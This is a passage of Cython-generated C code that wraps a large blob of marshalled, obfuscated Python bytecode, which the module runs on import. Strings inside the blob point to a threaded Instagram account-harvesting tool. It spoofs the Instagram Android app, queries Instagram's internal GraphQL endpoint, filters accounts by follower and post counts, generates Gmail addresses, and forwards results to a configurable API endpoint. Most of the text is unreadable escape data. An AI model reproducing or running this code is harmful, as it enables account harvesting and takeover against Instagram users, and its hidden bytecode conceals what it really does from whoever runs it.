0\000\000_\002b\003\360\000\000\014c\003\360\000\000\014c\003\2007\335\021\031\224\035\320\037Z\320cj\320pt\320\021u\321\021u\324\021u\200y\200y\370\330\003\026\220\025\220\025\220\025\370\370\370\330\005\037\240)\244.\320\0050\320\0050\265\025\260u\261\034\264\034\260\034\261\034\335\010\022\220A\211\r\210\n\211\n\330\007\r\210q\202y\200y\330\007U\2003\360\000\000_\001s\002\360\000\000c\002h\002\360\000\000_\001s\002\360\000\000_\001s\002\360\000\000_\001s\002\320V]\360\000\000|\002}\021\360\000\000}\002I\003\360\000\000J\003Z\003\360\000\000J\003Z\003\361\000\000J\003\\\003\364\000\000J\003\\\003\360\000\000|\002}\021\360\000\000]\003n\003\360\000\000o\003v\003\360\000\000|\002}\021\360\000\000w\003K\004\360\000\000L\004S\004\360\000\000|\002}\021\360\000\000T\004h\004\360\000\000i\004p\004\360\000\000|\002}\021\360\000\000q\004F\005\360\000\000G\005s\005\360\000\000|\002}\021\360\000\000t\005L\006\360\000\000M\006]\006\360\000\000|\002}\021\360\000\000^\006y\006\360\000\000z\006B\007\360\000\000|\002}\021\360\000\000C\007`\007\360\000\000a\007d\007\360\000\000|\002}\021\360\000\000e\007B\010\360\000\000C\010F""\010\360\000\000|\002}\021\360\000\000G\010[\010\360\000\000\\\010^\t\360\000\000|\002}\021\360\000\000_\to\t\360\000\000p\ts\t\360\000\000|\002}\021\360\000\000t\tK\n\360\000\000L\nR\n\360\000\000|\002}\021\360\000\000S\nc\n\360\000\000d\nJ\013\360\000\000|\002}\021\360\000\000K\013b\013\360\000\000c\013I\014\360\000\000|\002}\021\360\000\000J\014[\014\360\000\000\\\014v\014\360\000\000|\002}\021\360\000\000w\014M\r\360\000\000N\rU\r\360\000\000|\002}\021\360\000\000V\rl\r\360\000\000m\ry\r\360\000\000|\002}\021\360\000\000Q\016^\016\360\000\000s\016}\016\360\000\000L\017]\017\360\000\000i\017n\017\360\000\000A\020H\020\360\000\000Q\020o\020\360\000\000F\021I\021\360\000\000Y\021|\021\360\000\000|\002}\021\360\000\000|\002}\021\360\000\000|\002}\021\360\000\000t\002{\002\365\000\000G\022O\022\364\000\000G\022T\022\360\000\000U\022X\022\360\000\000^\022e\022\360\000\000n\022u\022\360\000\000G\022v\022\361\000\000G\022v\022\364\000\000G\022v\022\360\000\000~\021F\022\330\006\016\324\006\032\230C\322\006\037\320\006\037\330\022\032\227-\222-\221/\224/\200M\330\006.\265\023\260]\3211C\3241C\320\006C\320\006C\305E\310%\301L\304L\300L\300L\335\t\023\220Q\211\035\210\032\370\330\007\r\210q\202y\200y\330\0075\2003\360\000\000?f\007\320M^\324Mc\360\000\000?f\007\360\000\000?f\007\360\000\000j\002{\002\364\000\000j\002\002\360\000\000?f\007\360\000\000?f\007\360\000\000Z\004k\004\364\000\000Z\004o\004\360\000\000?f\007\360\000\000?f\007\360\000\000D\005I\005\360\000\000?f\007\360\000\000?f\007\365\000\000a\005e\005\364\000\000a\005k\005\361\000\000a\005m\005\364\000\000a\005m\005\360\000\000?f\007\360\000\000?f\007\360\000\000J\006[\006\364\000\000J\006c\006\360\000\000?f\007\360\000\000?f\007\360\000\000?f\007\260g\360\000\000}\007M\010\360\000\000}\007M\010\361\000\000}\007O\010\364\000\000}\007O\010\360\000\000b\010q\010\360\000\000A\td\t\365\000\000{\t~\t\365\000\000\tC\n\364\000\000\tI\n\361\000\000\tK\n\364\000\000\tK\n\361\000\000{\tL\n\364\000\000{\tL\n\365\000""\000f\ni\n\360\000\000j\nr\n\367\000\000j\ny\n\362\000\000j\ny\n\365\000\000z\n~\n\361\000\000z\n@\013\364\000\000z\n@\013\361\000\000j\nA\013\364\000\000j\nA\013\361\000\000f\nB\013\364\000\000f\nB\013\360\000\000[\013c\013\360\000\000@\014H\014\360\000\000g\014j\014\360\000\000I\rL\r\360\000\000b\rd\016\360\000\000|\016I\017\360\000\000^\017h\017\360\000\000w\017H\020\360\000\000[\020i\020\360\000\000}\020D\021\360\000\000o\007E\021\360\000\000o\007E\021\360\000\000g\007n\007\365\000\000J\021R\021\364\000\000J\021W\021\360\000\000X\021[\021\360\000\000a\021h\021\360\000\000q\021x\021\360\000\000J\021y\021\361\000\000J\021y\021\364\000\000J\021y\021\364\000\000J\021~\021\360\000\000F\021I\021\330\005\024\220s\320\005\032\320\005\032\240%\230z\250C\320\037/\320\037/\265\005\260e\261\014\264\014\260\014\260\014\335\010\022\220A\211\r\210\n\370\370\330\001\014\210\004\210\004\370\370\370\335\001\006\320\007H\2259\320\007H\320\007H\245Z\320\007H\320\007H\275Y\320\007H\320\007H\310b\320\001Q\321\001Q\324\001Q\320\001Q\320\001Q\320\001Qst\000\000\000\234N\016Z+\000\316*\027O\002\000\317\001\001Z+\000\317\002\nO\030\003\317\014\001O\023\003\317\r\001O\030\003\317\016\004Z+\000\317\023\005O\030\003\317\030\003Z+\000\317\033B;R\027\000\322\026\001Z+\000\322\027\nR#\003\322!&Z+\000\323\007\027S\037\000\323\036\001Z+\000\323\037\002S$\003\323!\001Z+\000\323$G\006Z+\000\332+\002Z/\003c\000\000\000\000\000\000\000\000\000\000\000\000\002\000\000\000\003\000\000\000\363\"\000\000\000\227\000t\001\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000d\000S\000r0\000\000\000)\001\332\004ppppr\333\000\000\000r8\000\000\000r\022\000\000\000\332\014update_statsri\001\000\000\341\000\000\000s\017\000\000\000\200\000\335\004\010\201F\204F\200F\200F\200Fr8\000\000\000)\002r!\000\000\000r \000\000\000)\001\332\006Threadc\000\000\000\000\000\000\000\000\000\000\000\000\023\000\000\000\003\000\000\000\363~\004\000\000\227\000\t\000\t\000t""\001\000\000\000\000\000\000\000\000\000\000t\003\000\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000d\002d\003\246\002\000\000\253\002\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000}\000t\001\000\000\000\000\000\000\000\000\000\000t\003\000\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000d\004d\005\246\002\000\000\253\002\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000}\001d\006t\003\000\000\000\000\000\000\000\000\000\000j\003\000\000\000\000\000\000\000\000g\000d\007\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\233\000d\010t\003\000\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000d\td\n\246\002\000\000\253\002\000\000\000\000\000\000\000\000\233\000d\013t\003\000\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000d\014d\r\246\002\000\000\253\002\000\000\000\000\000\000\000\000\233\000d\016t\003\000\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000d\014d\r\246\002\000\000\253\002\000\000\000\000\000\000\000\000\233\000d\010t\003\000\000\000\000\000\000\000\000\000\000j\003\000\000\000\000\000\000\000\000g\000d\017\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\233\000d\020|\001\233\000d\020|\001\233\000d\021t\003\000\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000d\022d\005\246\002\000\000\253\002\000\000\000\000\000\000\000\000\233\000d\023\235\021}\002d\024\240\004\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t\003\000\000\000\000\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000t\014\000\000\000\000\000\000\000\000\000\000j\007\000\000\000\000\000\000\000\000t\014\000\000\000\000\000\000\000\000\000\000j\010\000\000\000\000\000\000\000\000z\000\000\000d\025\254\026\246\002\000\000\253\002\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000""\000\000\000\000}\003d\027d\030d\031d\032d\033d\034d\035|\002d\036|\003d\037\234\n}\004|\003d d\036t\023\000\000\000\000\000\000\000\000\000\000j\n\000\000\000\000\000\000\000\000|\000d!d\"\234\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000d#d$d%\234\006}\005t\027\000\000\000\000\000\000\000\000\000\000j\014\000\000\000\000\000\000\000\000d&|\004|\005\254'\246\003\000\000\253\003\000\000\000\000\000\000\000\000}\006|\006\240\t\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000}\007|\007\240\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d(i\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000\240\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d)i\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\010|\010\240\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d*d\024\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\t|\tr}d+|\tv\001ryt\035\000\000\000\000\000\000\000\000\000\000|\t\246\001\000\000\253\001\000\000\000\000\000\000\000\000d,k\005\000\000\000\000rft\037\000\000\000\000\000\000\000\000\000\000|\010\240\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d-d.\246\002\000\000\253\002\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000}\nt\037\000\000\000\000\000\000\000\000\000\000|\010\240\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d/d.\246\002\000\000\253\002\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000}\013|\nd0k\005\000\000\000\000r\032|\013d.k\004\000\000\000\000r\024|\t\233\000d1\235\002}\014t!\000\000\000\000\000\000\000\000\000\000|\014\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000n\021#\000t\"\000\000\000\000\000\000\000\000\000\000$\000r\004\001\000Y\000\220\002\2148w""\000x\003Y\000w\001\220\002\214=)2NTr\271\000\000\000r\275\000\000\000\351\226\000\000\000i\347\003\000\000z\"Instagram 311.0.0.32.118 Android ()\006z\00623/6.0z\00624/7.0z\01025/7.1.1z\00626/8.0z\00627/8.1z\00628/9.0r\032\001\000\000\351d\000\000\000i\024\005\000\000z\005dpi; rS\001\000\000i\320\007\000\000\332\001x)\014\332\007SAMSUNG\332\006HUAWEIz\007LGE/lge\332\003HTC\332\004ASUS\332\003ZTE\332\007ONEPLUS\332\006XIAOMI\332\004OPPO\332\004VIVO\332\004SONY\332\006REALMEz\006; SM-Tz\025; qcom; en_US; 545986\351o\000\000\000r\033\001\000\000r.\000\000\000\351 \000\000\000)\001\332\001krA\000\000\000z\016en,en-US;q=0.9r/\001\000\000rF\000\000\000r0\001\000\000z\006u=1, iz.https://www.instagram.com/instagram/following/\332\"PolarisUserHoverCardContentV2Query)\nr@\000\000\000rB\000\000\000rC\000\000\000\332\003dntrQ\000\000\000rR\001\000\000rR\000\000\000rI\000\000\000z\022x-fb-friendly-namez\010x-fb-lsd\332\013RelayModern\332\tcristiano)\002\332\006userIDr\257\000\000\000rO\001\000\000\332\0207717269488336001)\006\332\003lsd\332\023fb_api_caller_class\332\030fb_api_req_friendly_name\332\tvariables\332\021server_timestamps\332\006doc_idr8\001\000\000r\241\000\000\000rU\000\000\000r\243\000\000\000r\257\000\000\000rK\001\000\000r9\000\000\000\332\016follower_countr\002\000\000\000\332\013media_count\351\n\000\000\000z\n@gmail.com)\022r_\000\000\000r\347\000\000\000\332\007randintr!\000\000\000r\\\000\000\000\332\007choices\332\006string\332\rascii_letters\332\006digitsr\242\000\000\000rW\001\000\000r\005\000\000\000r+\000\000\000r\006\000\000\000\332\003lenr\306\000\000\000rf\001\000\000r\016\000\000\000)\rr\024\000\000\000\332\003rndr+\001\000\000r\203\001\000\000r\025\000\000\000rU\000\000\000r\017\000\000\000\332\rresponse_jsonr\312\000\000\000r\257\000\000\000r\211\001\000\000r\212\001\000\000r}\000\000\000s\r\000\000\000             r\022\000\000\000\332\tsteinmainr\224\001\000\000\347\000\000\000s\333\002\000\000\200\000\360\002+\005\025\360\002*\t\025\335\026""\031\235&\234.\250\032\260[\321\032A\324\032A\321\026B\324\026B\210G\335\022\025\225f\224n\240S\250#\321\026.\324\026.\321\022/\324\022/\210C\360\004\003\021X\001\265V\264]\360\000\000D\001B\002\360\000\000D\001B\002\360\000\000D\001B\002\361\000\0006C\002\364\000\0006C\002\360\000\003\021X\001\360\000\003\021X\001\335\023\031\224>\240#\240t\321\023,\324\023,\360\003\003\021X\001\360\000\003\021X\001\33539\264>\300#\300t\3213L\3243L\360\003\003\021X\001\360\000\003\021X\001\335OU\314~\320^a\320cg\321Oh\324Oh\360\003\003\021X\001\360\000\003\021X\001\345\023\031\224=\360\000\000\"O\002\360\000\000\"O\002\360\000\000\"O\002\361\000\000\024P\002\364\000\000\024P\002\360\005\003\021X\001\360\000\003\021X\001\360\006\000\030\033\360\007\003\021X\001\360\000\003\021X\001\360\006\000#&\360\007\003\021X\001\360\000\003\021X\001\365\006\000=C\001\274N\3103\320PS\321<T\324<T\360\007\003\021X\001\360\000\003\021X\001\360\000\003\021X\001\360\003\000\r\027\360\014\000\023\025\227'\222'\235&\234.\255\026\324)=\305\006\304\r\321)M\320QS\320\032T\321\032T\324\032T\321\022U\324\022U\210C\340\032\037\330#3\330 C\330\027\032\330\0325\330\034$\330\033K\330\036(\330&J\330\034\037\360\025\013\027\016\360\000\013\027\016\210G\360\032\000\030\033\330'4\330,P\335\035!\234Z\2607\310\013\320(T\320(T\321\035U\324\035U\330%+\330\032,\360\r\007\024\016\360\000\007\024\016\210D\365\020\000\030 \224}\320%L\320V]\320dh\320\027i\321\027i\324\027i\210H\330\034$\237M\232M\231O\234O\210M\330\030%\327\030)\322\030)\250&\260\"\321\0305\324\0305\327\0309\322\0309\270&\300\"\321\030E\324\030E\210I\330\027 \227}\222}\240Z\260\022\321\0274\324\0274\210H\340\017\027\360\000\005\r&\230C\240x\320\034/\320\034/\265C\270\010\261M\264M\300Q\3224F\3204F\335!$\240Y\247]\242]\3203C\300Q\321%G\324%G\321!H\324!H\220\016\335\036!\240)\247-\242-\260\r\270q\321\"A\324\"A\321\036B\324\036B\220\013\330\023!\240R\322\023'\320\023'\250K\270!\252O\250O\330\037'\320\0343\320\0343\320\0343\220E\335\024\036\230u\321\024%\324""\024%\320\024%\370\370\335\017\030\360\000\001\t\025\360\000\001\t\025\360\000\001\t\025\330\014\024\211H\360\003\001\t\025\370\370\370\361U\001+\005\025s\022\000\000\000\203H(H,\000\310,\nH:\003\3109\001H:\003rS\001\000\000)\001\332\006target)i\332\003red\332\005green\332\006yellow\332\004blue\332\004cyan\332\007magenta\332\001M\332\005white\332\006orange\332\005resetr\005\000\000\000r\014\000\000\000r\007\000\000\000r\023\000\000\000\332\007API_URL\332\007API_KEY\332\005inputr\262\000\000\000r\305\000\000\000r\r\000\000\000r\006\000\000\000r\242\000\000\000re\001\000\000rg\000\000\000r?\001\000\000r\347\000\000\000r\353\000\000\000r\351\000\000\000\332\016fake_useragentr\030\000\000\000\332\tthreadingr\036\000\000\000r\345\000\000\000\332\007secretsr\031\000\000\000\332\003ms4r\032\000\000\000r\033\000\000\000r\216\001\000\000\332\005queuer\034\000\000\000r+\001\000\000r\035\000\000\000\332\006systemr\037\000\000\000r \000\000\000r!\000\000\000r\307\000\000\000rV\001\000\000r\325\000\000\000\332\004BLUE\332\005RESET\332\004BOLD\332\006YELLOW\332\003RED\332\005GREEN\332\004CYAN\332\007MAGENTA\332\001E\332\001G\332\001Z\332\001Q\332\001X\332\002Z1\332\001F\332\001A\332\001C\332\001B\332\001Y\332\001S\332\001U\332\004BRed\332\006BGreen\332\007BYellow\332\001R\332\007BPurple\332\005BCyan\332\006BWhite\332\006cfontsr)\000\000\000r\310\000\000\000r+\000\000\000rd\000\000\000r`\000\000\000r2\000\000\000r^\000\000\000ra\000\000\000r3\000\000\000\332\003idsrk\000\000\000r|\000\000\000r\244\000\000\000r\323\000\000\000r\326\000\000\000rf\001\000\000ri\001\000\000rj\001\000\000r\224\001\000\000\332\007threadsr]\000\000\000rK\001\000\000\332\001t\332\005start\332\006appendr\\\000\000\000r\333\000\000\000r8\000\000\000r\022\000\000\000\372\010<module>r\313\001\000\000\001\000\000\000sN\005\000\000\360\003\001\001\001\340\006\027\200\003\330\010\031\200\005\330\t\032\200\006\330\007\030\200\004\330\007\030\200\004\330\n\033\200\007\330\004\025\200\001\330\010\031\200\005\330""\t \200\006\330\010\021\200\005\340\000\017\200\017\200\017\200\017\330\000\n\200\n\200\n\200\n\340\010o\200\005\360\004\t\001\023\360\000\t\001\023\360\000\t\001\023\360\026\000\001\r\200\014\201\016\204\016\200\016\340\000\017\200\017\200\017\200\017\340\n5\200\007\330\n\025\200\007\340\005\n\200U\220\003\320\0130\320\0130\320\0130\321\0051\324\0051\200\002\340\007\t\207z\202z\201|\204|\360\000\001\001\034\330\004\010\200D\320\t\032\321\004\033\324\004\033\320\004\033\340\006\022\200h\204l\2207\240[\260'\320$:\300I\310r\300?\320\006S\321\006S\324\006S\327\006X\322\006X\321\006Z\324\006Z\200\003\340\003\006\2077\2027\2108\321\003\024\324\003\024\230\010\322\003 \320\003 \330\004\010\200D\320\t2\321\0043\324\0043\320\0043\340\000\022\320\000\022\320\000\022\320\000\022\320\000\022\320\000\022\320\000\022\320\000\022\330\000\030\320\000\030\320\000\030\320\000\030\320\000\030\320\000\030\330\000\017\200\017\200\017\200\017\330\000\r\200\r\200\r\200\r\330\000\017\200\017\200\017\200\017\330\000\013\200\013\200\013\200\013\330\000\013\200\013\200\013\200\013\330\000\016\200\016\200\016\200\016\330\000$\320\000$\320\000$\320\000$\320\000$\320\000$\330\000\020\320\000\020\320\000\020\320\000\020\330\000\n\200\n\200\n\200\n\330\000\013\200\013\200\013\200\013\330\000\020\320\000\020\320\000\020\320\000\020\330\000\035\320\000\035\320\000\035\320\000\035\320\000\035\320\000\035\330\000 \320\000 \320\000 \320\000 \320\000 \320\000 \320\000 \320\000 \330\000\t\200\t\200\t\200\t\330\000\r\200\r\200\r\200\r\330\000\027\320\000\027\320\000\027\320\000\027\320\000\027\320\000\027\330\004.\320\004.\320\004.\320\004.\320\004.\320\004.\320\004.\370\330\000U\200y\200r\204y\320\021)\321\007*\324\007*\320\007*\320+U\320+U\320+U\320+U\320+U\320+U\320+U\320+U\370\370\370\330\000\025\320\000\025\320\000\025\320\000\025\320\000\025\320\000\025\330\000\027\320\000\027\320\000\027\320\000\027\320\000\027\320\000\027\330\000#\320\000#\320\000#\320\000#\320\000#\320\000#\320\000#\320\000#""\330\000\t\200\t\200\t\200\t\330\037 \320\000 \200\t\320\000 \210*\220Y\360\002\000/D\002\321\000-\200\004\200U\2104\220\006\220s\2305\240\024\240g\330\002\016\200\001\330\002\016\200\001\330\002\016\200\001\330\002\016\200\001\330\002\016\200\001\330\003\017\200\002\330\002\016\200\001\330\002\016\200\001\330\002\016\200\001\330\002\022\200\001\330\002\016\200\001\330\002\016\200\001\330\002\016\200\001\330\002\016\200\001\330\005\021\200\004\330\007\023\200\006\330\010\024\200\007\330\002\016\200\001\330\010\024\200\007\330\006\022\200\005\330\007\023\200\006\330\005\017\200\004\330\006\017\200\005\330\005\016\200\004\330\007\021\200\006\330\004\016\200\003\330\006\020\200\005\330\005\017\200\004\330\010\022\200\007\330\004\035\320\004\035\320\004\035\320\004\035\320\004\035\320\004\035\320\004\035\370\330\000G\200y\200r\204y\320\021,\321\007-\324\007-\320\007-\320.G\320.G\320.G\320.G\320.G\320.G\320.G\320.G\370\370\370\330\006\013\200e\220\025\320\014;\320\014;\320\014;\321\006<\324\006<\200\005\330\000\t\200\002\204\t\210'\321\000\022\324\000\022\320\000\022\330\000\037\320\000\037\320\000\037\320\000\037\320\000\037\320\000\037\330\0000\320\0000\320\0000\320\0000\320\0000\320\0000\330\000\037\320\000\037\320\000\037\320\000\037\320\000\037\320\000\037\330\000\"\320\000\"\320\000\"\320\000\"\320\000\"\320\000\"\330\000\t\200\t\200\t\200\t\330\003\037\200\002\330\004\006\200\003\360\002\006\001&\360\000\006\001&\360\000\006\001&\360\016\000\001\004\200\003\201\005\204\005\200\005\360\002\t\001\033\360\000\t\001\033\360\000\t\001\033\360\024\003\001\n\360\000\003\001\n\360\000\003\001\n\360\010*\001\r\360\000*\001\r\360\000*\001\r\360V\001\005\001\013\360\000\005\001\013\360\000\005\001\013\360\014)\001R\001\360\000)\001R\001\360\000)\001R\001\360T\001\001\001\013\360\000\001\001\013\360\000\001\001\013\340\000\017\200\017\200\017\200\017\330\000#\320\000#\320\000#\320\000#\320\000#\320\000#\320\000#\320\000#\330\000\034\320\000\034\320\000\034\320\000\034\320""\000\034\320\000\034\330\000*\320\000*\320\000*\320\000*\320\000*\320\000*\360\002,\001\025\360\000,\001\025\360\000,\001\025\360Z\001\000\013\r\200\007\330\t\016\210\025\210s\211\032\214\032\360\000\003\001\026\360\000\003\001\026\200A\330\010\016\210\006\220i\320\010 \321\010 \324\010 \200A\330\004\005\207G\202G\201I\204I\200I\330\004\013\207N\202N\2201\321\004\025\324\004\025\320\004\025\320\004\025\340\t\020\360\000\001\001\r\360\000\001\001\r\200A\330\004\005\207F\202F\201H\204H\200H\200H\360\003\001\001\r\360\000\001\001\rs\030\000\000\000\304\006\006D\r\000\304\r\030D'\003\306\r\006F\024\000\306\024\030F.\003";
static PyObject *__pyx_n_s_builtins;
static PyObject *__pyx_kp_b_c_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_loads;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_marshal;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_tuple_;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},
  {&__pyx_kp_b_c_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d, __pyx_k_c_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d, sizeof(__pyx_k_c_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d), 0, 0, 0, 0},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_marshal, __pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  return 0;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_b_c_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
